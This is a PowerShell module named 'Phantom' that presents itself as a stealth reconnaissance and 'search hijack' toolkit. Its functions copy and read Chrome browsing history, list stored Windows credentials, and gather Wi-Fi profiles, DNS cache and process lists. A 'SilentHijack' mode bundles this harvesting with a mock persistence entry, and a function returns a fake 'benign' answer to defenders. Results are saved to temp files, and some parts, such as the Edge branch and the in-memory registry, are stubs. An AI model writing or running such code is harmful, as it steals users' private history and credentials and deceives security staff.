# Modules/Phantom.ps1
# Phantom Module: Combines SearchPhantom and PrismGhost capabilities
# Advanced stealth recon and search hijack operations

$script:PhantomRegistry = @{}
$script:PhantomActive = $false

function Write-PhantomLog {
    param([string]$Message, [string]$Component = "Phantom")
    $logFile = "$env:ProgramData\ghost_ops_log.txt"
    $timestamp = Get-Date -Format o
    try {
        Add-Content -Path $logFile -Value "[$timestamp][$Component] $Message" -ErrorAction SilentlyContinue
    }
    catch {}
}

# PrismGhost: Registry Echo and Persistence Tracker
function Initialize-WhisperReg {
    param(
        [Parameter(Mandatory = $true)]
        [string]$TargetKey,
        [string]$PayloadValue,
        [switch]$ShadowEcho
    )
    
    $script:PhantomRegistry[$TargetKey] = @{
        Payload = $PayloadValue
        Timestamp = (Get-Date).ToUniversalTime()
        ShadowEcho = $ShadowEcho.IsPresent
        Status = "Active"
    }
    
    Write-PhantomLog "Registered key: $TargetKey" -Component "PrismGhost"
    return $true
}

function Get-WhisperRegistry {
    return $script:PhantomRegistry.Clone()
}

function Export-WhisperRegistryLog {
    param([string]$OutputPath = "$env:TEMP\phantom_registry.json")
    
    $export = $script:PhantomRegistry | ConvertTo-Json -Depth 5
    Set-Content -Path $OutputPath -Value $export -Force
    Write-PhantomLog "Registry exported to: $OutputPath" -Component "PrismGhost"
    return $OutputPath
}

function Invoke-SilentPersistenceHook {
    param([string]$TargetKey)
    
    if ($script:PhantomRegistry.ContainsKey($TargetKey)) {
        $script:PhantomRegistry[$TargetKey].Timestamp = (Get-Date).ToUniversalTime()
        Write-PhantomLog "$TargetKey silently reaffirmed" -Component "PrismGhost"
        return $true
    }
    else {
        Write-PhantomLog "$TargetKey not found in registry" -Component "PrismGhost"
        return $false
    }
}

function Get-FakeDefenderResponse {
    param([string]$Key)
    
    if ($script:PhantomRegistry.ContainsKey($Key)) {
        return "benign.registry.trace"
    }
    return "not.found"
}

# SearchPhantom: Browser-based reconnaissance
function Get-BrowserHistory {
    param(
        [ValidateSet("Chrome", "Firefox", "Edge", "All")]
        [string]$Browser = "All",
        [int]$Limit = 100
    )
    
    $history = @()
    
    if ($Browser -eq "Chrome" -or $Browser -eq "All") {
        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
        if (Test-Path $chromePath) {
            try {
                $tempDb = "$env:TEMP\chrome_history_$(Get-Random).db"
                Copy-Item $chromePath $tempDb -Force
                
                Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue
                $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;Read Only=True;")
                $conn.Open()
                
                $cmd = $conn.CreateCommand()
                $cmd.CommandText = "SELECT url, title, visit_count, datetime(last_visit_time/1000000-11644473600, 'unixepoch') as last_visit FROM urls ORDER BY last_visit_time DESC LIMIT $Limit"
                
                $reader = $cmd.ExecuteReader()
                while ($reader.Read()) {
                    $history += [PSCustomObject]@{
                        Browser = "Chrome"
                        URL = $reader["url"]
                        Title = $reader["title"]
                        VisitCount = $reader["visit_count"]
                        LastVisit = $reader["last_visit"]
                    }
                }
                
                $conn.Close()
                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
            }
            catch {
                Write-PhantomLog "Chrome history access failed: $_" -Component "SearchPhantom"
            }
        }
    }
    
    if ($Browser -eq "Edge" -or $Browser -eq "All") {
        $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
        if (Test-Path $edgePath) {
            try {
                $tempDb = "$env:TEMP\edge_history_$(Get-Random).db"
                Copy-Item $edgePath $tempDb -Force
                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
            }
            catch {}
        }
    }
    
    Write-PhantomLog "Collected $($history.Count) history entries" -Component "SearchPhantom"
    return $history
}

function Get-SavedCredentials {
    param([switch]$IncludePasswords)
    
    $credentials = @()
    
    $vaultCreds = cmdkey /list 2>$null
    if ($vaultCreds) {
        $currentCred = $null
        foreach ($line in $vaultCreds) {
            if ($line -match "Target:\s*(.+)") {
                if ($currentCred) { $credentials += $currentCred }
                $currentCred = [PSCustomObject]@{
                    Target = $Matches[1].Trim()
                    Type = ""
                    User = ""
                }
            }
            elseif ($line -match "Type:\s*(.+)" -and $currentCred) {
                $currentCred.Type = $Matches[1].Trim()
            }
            elseif ($line -match "User:\s*(.+)" -and $currentCred) {
                $currentCred.User = $Matches[1].Trim()
            }
        }
        if ($currentCred) { $credentials += $currentCred }
    }
    
    Write-PhantomLog "Found $($credentials.Count) stored credentials" -Component "SearchPhantom"
    return $credentials
}

function Get-NetworkFingerprint {
    $fingerprint = @{
        Hostname = $env:COMPUTERNAME
        Username = $env:USERNAME
        Domain = $env:USERDOMAIN
        Interfaces = @()
        WiFiProfiles = @()
        DNSCache = @()
    }
    
    Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | ForEach-Object {
        $fingerprint.Interfaces += [PSCustomObject]@{
            Name = $_.Name
            MAC = $_.MacAddress
            Speed = $_.LinkSpeed
        }
    }
    
    try {
        $wifiOutput = netsh wlan show profiles 2>$null
        if ($wifiOutput) {
            $wifiOutput | ForEach-Object {
                if ($_ -match "All User Profile\s*:\s*(.+)") {
                    $fingerprint.WiFiProfiles += $Matches[1].Trim()
                }
            }
        }
    }
    catch {}
    
    try {
        Get-DnsClientCache | Select-Object -First 20 | ForEach-Object {
            $fingerprint.DNSCache += $_.Entry
        }
    }
    catch {}
    
    Write-PhantomLog "Network fingerprint collected" -Component "SearchPhantom"
    return $fingerprint
}

function Start-PhantomRecon {
    param(
        [ValidateSet("Full", "Quick", "SilentHijack", "Fingerprint")]
        [string]$Mode = "Quick",
        [string]$LogPath = "$env:TEMP\phantom_recon.log"
    )
    
    $script:PhantomActive = $true
    Write-PhantomLog "Phantom Recon started - Mode: $Mode" -Component "Phantom"
    
    $results = @{
        Mode = $Mode
        StartTime = (Get-Date).ToUniversalTime()
        Hostname = $env:COMPUTERNAME
        Data = @{}
    }
    
    switch ($Mode) {
        "Full" {
            $results.Data.History = Get-BrowserHistory -Browser All -Limit 200
            $results.Data.Credentials = Get-SavedCredentials
            $results.Data.Network = Get-NetworkFingerprint
            $results.Data.Registry = Get-WhisperRegistry
            $results.Data.Processes = Get-Process | Select-Object -First 50 Name, Id, CPU, WorkingSet
        }
        "Quick" {
            $results.Data.Network = Get-NetworkFingerprint
            $results.Data.Processes = Get-Process | Select-Object -First 20 Name, Id
        }
        "SilentHijack" {
            $results.Data.History = Get-BrowserHistory -Browser Chrome -Limit 50
            $results.Data.Credentials = Get-SavedCredentials
            Initialize-WhisperReg -TargetKey "HKCU\Software\Phantom" -PayloadValue "SilentHijack" -ShadowEcho
        }
        "Fingerprint" {
            $results.Data.Network = Get-NetworkFingerprint
        }
    }
    
    $results.EndTime = (Get-Date).ToUniversalTime()
    
    $jsonResults = $results | ConvertTo-Json -Depth 10
    Set-Content -Path $LogPath -Value $jsonResults -Force
    
    Write-PhantomLog "Phantom Recon complete - Results: $LogPath" -Component "Phantom"
    $script:PhantomActive = $false
    
    return $results
}

function Stop-PhantomRecon {
    $script:PhantomActive = $false
    Write-PhantomLog "Phantom Recon stopped" -Component "Phantom"
}

function Clear-PhantomRegistry {
    $script:PhantomRegistry.Clear()
    Write-PhantomLog "Phantom registry cleared" -Component "PrismGhost"
}

function Test-PhantomActive {
    return $script:PhantomActive
}

Export-ModuleMember -Function Start-PhantomRecon, Stop-PhantomRecon, Initialize-WhisperReg, Get-WhisperRegistry, Export-WhisperRegistryLog, Invoke-SilentPersistenceHook, Get-FakeDefenderResponse, Get-BrowserHistory, Get-SavedCredentials, Get-NetworkFingerprint, Clear-PhantomRegistry, Test-PhantomActive
